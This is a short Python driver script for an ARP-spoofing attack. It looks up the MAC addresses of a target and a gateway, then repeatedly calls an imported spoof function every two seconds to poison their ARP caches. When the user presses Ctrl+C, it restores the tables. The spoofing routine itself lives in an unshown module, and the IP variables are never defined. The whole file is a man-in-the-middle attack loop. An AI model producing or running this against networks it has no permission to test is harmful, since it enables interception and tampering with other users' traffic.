from core import spoof
import time

# 1. Get MAC addresses once at the start
target_mac = spoof.get_mac(target_ip)
gateway_mac = spoof.get_mac(gateway_ip)

try:
    print("[*] Sent packets. Press Ctrl+C to stop.")
    while True:
        # 2. Pass the pre-resolved MACs to the spoof function
        spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] Detected Ctrl+C. Restoring network... please wait.")
    # 3. Fix the network before exiting
    spoof.restore(target_ip, gateway_ip)
    spoof.restore(gateway_ip, target_ip)
    print("[+] Network restored. Exiting.")
